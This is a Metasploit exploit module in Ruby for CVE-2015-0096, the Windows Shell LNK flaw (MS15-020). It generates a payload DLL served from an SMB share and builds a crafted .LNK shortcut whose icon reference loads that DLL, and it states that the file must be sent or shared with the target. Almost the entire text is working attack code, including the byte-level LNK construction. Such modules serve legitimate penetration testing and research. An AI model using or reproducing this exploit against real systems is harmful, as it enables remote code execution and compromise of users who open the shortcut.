# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::SMB::Server::Share

  attr_accessor :exploit_dll_name

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;      => &#039;Microsoft Windows Shell LNK Code Execution&#039;,
      &#039;Description&#039;  => %q{
        This module exploits a vulnerability in the MS10-046 patch to abuse (again) the handling
        of Windows Shortcut files (.LNK) that contain an icon resource pointing to a malicious
        DLL. This creates an SMB resource to provide the payload and the trigger, and generates a
        LNK file which must be sent to the target. This module has been tested successfully on
        Windows 2003 SP2 with MS10-046 installed and Windows 2008 SP2 (32 bits) with MS14-027
        installed.
      },
      &#039;Author&#039;    =>
        [
          &#039;Michael Heerklotz&#039;, # Vulnerability discovery
          &#039;juan vazquez&#039; # msf module
        ],
      &#039;License&#039;    => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [&#039;CVE&#039;, &#039;2015-0096&#039;],
          [&#039;MSB&#039;, &#039;MS15-020&#039;],
          [&#039;URL&#039;, &#039;http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Full-details-on-CVE-2015-0096-and-the-failed-MS10-046-Stuxnet/ba-p/6718459#.VQBOymTF9so&#039;],
          [&#039;URL&#039;, &#039;https://github.com/rapid7/metasploit-framework/pull/4911&#039;] # How to guide here
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;process&#039;,
        },
      &#039;Payload&#039;    =>
        {
          &#039;Space&#039;  => 2048,
        },
      &#039;Platform&#039;    => &#039;win&#039;,
      &#039;Targets&#039;    =>
        [
          [ &#039;Automatic&#039;,  { } ]
        ],
      &#039;DisclosureDate&#039; => &#039;Mar 10 2015&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;FILENAME&#039;, [true, &#039;The LNK file&#039;, &#039;msf.lnk&#039;])
      ], self.class)

    register_advanced_options(
      [
        OptBool.new(&#039;DisablePayloadHandler&#039;, [false, &#039;Disable the handler code for the selected payload&#039;, false])
      ], self.class)

    deregister_options(&#039;FILE_CONTENTS&#039;, &#039;FILE_NAME&#039;)
  end

  def smb_host
    "\\\\#{srvhost}\\#{share}\\"
  end


  def setup
    super

    self.file_contents = generate_payload_dll
    random_char = rand_text_alpha(1)
    self.file_name = "#{random_char}.dll"

    print_status("Payload available on #{unc}...")
    print_status("Trigger available on #{smb_host}#{exploit_dll_name}...")
  end

  def primer
    lnk = generate_link("#{smb_host}#{exploit_dll_name}")
    file_create(lnk)
    print_status(&#039;The LNK file must be sent or shared with the target...&#039;)
  end

  def generate_link(unc)
    uni_unc = unc.unpack(&#039;C*&#039;).pack(&#039;v*&#039;)
    path = &#039;&#039;
    path << [
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    ].pack(&#039;C*&#039;)
    path << uni_unc

    # LinkHeader
    ret = [
      0x4c, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x46, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    ].pack(&#039;C*&#039;)

    idlist_data = &#039;&#039;
    idlist_data << [0x12 + 2].pack(&#039;v&#039;)
    idlist_data << [
      0x1f, 0x00, 0xe0, 0x4f, 0xd0, 0x20, 0xea, 0x3a, 0x69, 0x10, 0xa2, 0xd8, 0x08, 0x00, 0x2b, 0x30,
      0x30, 0x9d
    ].pack(&#039;C*&#039;)
    idlist_data << [0x12 + 2].pack(&#039;v&#039;)
    idlist_data << [
      0x2e, 0x1e, 0x20, 0x20, 0xec, 0x21, 0xea, 0x3a, 0x69, 0x10, 0xa2, 0xdd, 0x08, 0x00, 0x2b, 0x30,
      0x30, 0x9d
    ].pack(&#039;C*&#039;)
    idlist_data << [path.length + 2].pack(&#039;v&#039;)
    idlist_data << path
    idlist_data << [0x00].pack(&#039;v&#039;) # TERMINAL WOO

    # LinkTargetIDList
    ret << [idlist_data.length].pack(&#039;v&#039;) # IDListSize
    ret << idlist_data

    # ExtraData blocks (none)
    ret << [rand(4)].pack(&#039;V&#039;)

    # Patch in the LinkFlags
    ret[0x14, 4] = [&#039;10000001000000000000000000000000&#039;.to_i(2)].pack(&#039;N&#039;)
    ret
  end
end

